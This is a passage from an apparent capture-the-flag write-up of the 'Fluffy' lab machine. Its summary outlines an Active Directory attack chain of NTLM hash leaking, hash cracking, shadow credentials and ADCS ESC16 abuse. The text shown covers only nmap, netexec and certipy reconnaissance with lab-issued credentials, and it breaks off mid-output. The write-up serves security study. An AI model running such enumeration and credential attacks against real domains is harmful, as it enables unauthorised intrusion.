### Summary
The box requires a lot of active directory finnagling. We first gain a foothold on the box via a read/write SMB share automatically unarchiving directories while vulnerable to `CVE-2025-24071` which can lead to `NTLMv2` hash leaking and subsequent `hashcat`ing. We then leverage `bloodhound` to enumerate the AD environment and utilize these newfound credentials to perform lateral movement through the domain until discovering a certificate in the ADCS vulnerable to `ESC16` which allows us to forge an `administrator` ticket and associated hash

### Tools
- [[NetExec (nxc)|nxc]]
- `certipy` - check for certificate vulnerabilities (if a CA is present)
- `bloodhound.py` & `rusthound` - collect bloodhount data
- `smbclient`
- `responder` - capture incoming `SMB` request to leak `NTLM` hash
- `bloodyAD` - AD pocket knife, useful for all kinds of AD administration
- [[certipy]] - add shadow credentials and other attributes to Domain users, search for vulnerable certificates
- `hashcat`

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#Initial Credentials]]
- [[#ADCS]]
- [[#Bloodhound]]
- [[#SMB - TCP 445]]
	- [[#poc.py]]
- [[#CVE-2025-24071]]
- [[#Cracking Hash]]
###### [[#p.agila]]
- [[#Bloodhound2|Bloodhound]]
- [[#Recover NTLM For winrm_svc & ca_svc]]
	- [[#Clock Skew]]
	- [[#Shadow Credentials]]
###### [[#Root Shell]]
- [[#Bloodhound3|Bloodhound]]
- [[#ADCS]]
- [[#ESC16]]
- [[#Request Auth]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- -vvv --min-rate 10000 10.129.41.165 -oN nmap/tcp             
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-19 19:21 EST
...snip...
Completed SYN Stealth Scan at 19:22, 13.24s elapsed (65535 total ports)
Nmap scan report for 10.129.41.165
Host is up, received echo-reply ttl 127 (0.016s latency).
Scanned at 2025-12-19 19:21:54 EST for 13s
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49690/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49712/tcp open  unknown          syn-ack ttl 127
49725/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
           Raw packets sent: 131061 (5.767MB) | Rcvd: 24 (1.040KB)
```
```sh
❯ sudo nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985,9389,49667,49689,49690,49699,49712,49725 -sCV -vvv 10.129.41.165 -oN nmap/scripts
Starting Nmap 7.92 ( https://nmap.org ) at 2025-12-19 19:23 EST
...snip...
Scanned at 2025-12-19 19:23:36 EST for 96s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-20 07:23:08Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-20T07:24:37+00:00; +6h59m25s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765 a68f 4883 dc6d 0969 5d0d 3666 c880
| SHA-1: 72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-20T07:24:37+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765 a68f 4883 dc6d 0969 5d0d 3666 c880
| SHA-1: 72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-20T07:24:37+00:00; +6h59m25s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765 a68f 4883 dc6d 0969 5d0d 3666 c880
| SHA-1: 72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-20T07:24:37+00:00; +6h59m26s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765 a68f 4883 dc6d 0969 5d0d 3666 c880
| SHA-1: 72f3 1d5f e6f3 b8ab 6b0e dd77 5414 0d0c abfe e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAeFw0yNTA0MTcxNjA0MTdaFw0yNjA0
| MTcxNjA0MTdaMBoxGDAWBgNVBAMTD0RDMDEuZmx1ZmZ5Lmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAOFkXHPh6Bv/Ejx+B3dfWbqtAmtOZY7gT6XO
| KD/ljfOwRrRuvKhf6b4Qam7mZ08lU7Z9etWUIGW27NNoK5qwMnXzw/sYDgGMNVn4
| bb/2kjQES+HFs0Hzd+s/BBcSSp1BnAgjbBDcW/SXelcyOeDmkDKTHS7gKR9zEvK3
| ozNNc9nFPj8GUYXYrEbImIrisUu83blL/1FERqAFbgGwKP5G/YtX8BgwO7iJIqoa
| 8bQHdMuugURvQptI+7YX7iwDFzMPo4sWfueINF49SZ9MwbOFVHHwSlclyvBiKGg8
| EmXJWD6q7H04xPcBdmDtbWQIGSsHiAj3EELcHbLh8cvk419RD5ECAwEAAaOCAzgw
| ggM0MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFMlh3+130Pna
| 0Hgb9AX2e8Uhyr0FMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBB0co4Ym5z7RbSI
| 5tsj1jN/gg9EQzAxLmZsdWZmeS5odGIwTgYJKwYBBAGCNxkCBEEwP6A9BgorBgEE
| AYI3GQIBoC8ELVMtMS01LTIxLTQ5NzU1MDc2OC0yNzk3NzE2MjQ4LTI2MjcwNjQ1
| NzctMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAWjL2YkginWECPSm1EZyi8lPQisMm
| VNF2Ab2I8w/neK2EiXtN+3Z7W5xMZ20mC72lMaj8dLNN/xpJ9WIvQWrjXTO4NC2o
| 53OoRmAJdExwliBfAdKY0bc3GaKSLogT209lxqt+kO0fM2BpYnlP+N3R8mVEX2Fk
| 1WXCOK7M8oQrbaTPGtrDesMYrd7FQNTbZUCkunFRf85g/ZCAjshXrA3ERi32pEET
| eV9dUA0b1o+EkjChv+b1Eyt5unH3RDXpA9uvgpTJSFg1XZucmEbcdICBV6VshMJc
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49725/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 28482/tcp): CLEAN (Timeout)
|   Check 2 (port 56596/tcp): CLEAN (Timeout)
|   Check 3 (port 7234/udp): CLEAN (Timeout)
|   Check 4 (port 9929/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m25s, deviation: 0s, median: 6h59m25s
| smb2-time:
|   date: 2025-12-20T07:24:01
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:25
Completed NSE at 19:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.48 seconds
           Raw packets sent: 22 (944B) | Rcvd: 19 (820B)
```
- Immediate things of note:
	- We're working with Active Directory
	- Host.domain is `DC01.fluffy.htb`
	- `SMB` and `LDAP` are some good enumeration targets, also `HTTP`
	- We should also be aware of the clock skew if things start to get fucky with `kerberos`

- We can generate a hosts file with `netexec` and add it to our `/etc/hosts`:
```sh
❯ nxc smb 10.129.41.165 --generate-hosts-file hosts                             
SMB         10.129.41.165   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)

❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## Initial Credentials
---
As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / `J0elTHEM4n1990!`

- We can test the creds against `SMB`, `LDAP`, and `WinRM`:
```sh
❯ nxc smb fluffy.htb -u j.fleischman -p J0elTHEM4n1990!
SMB         10.129.41.165   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.41.165   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 

❯ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990!
LDAP        10.129.41.165   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.41.165   389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 

❯ nxc winrm fluffy.htb -u j.fleischman -p J0elTHEM4n1990!
WINRM       10.129.41.165   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) 
WINRM       10.129.41.165   5985   DC01             [-] fluffy.htb\j.fleischman:J0elTHEM4n1990!
```
- We get access to `SMB` and `LDAP`, but not `WinRM`, that'd be too easy
- Given that, we’ll want to prioritize things like:
	- `SMB` shares
	- Bloodhound (which includes most of the data from `LDAP`)
	- Active Directory Certificate Service (`ADCS`)

## ADCS
---
- We can verify that `ADCS` is running with `netexec`:
```sh
❯ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! -M adcs                          
LDAP        10.129.41.165   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
LDAP        10.129.41.165   389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
ADCS        10.129.41.165   389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.41.165   389    DC01             Found PKI Enrollment Server: DC01.fluffy.htb
ADCS        10.129.41.165   389    DC01             Found CN: fluffy-DC01-CA
```
- This shows a certificate authority was found, which means we can check for certificate vulnerabilities with `certipy`

- We can use `certipy` to retrieve certificates and check for vulnerabilities:
```sh
❯ certipy find -u j.fleischman@fluffy.htb -p J0elTHEM4n1990! -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
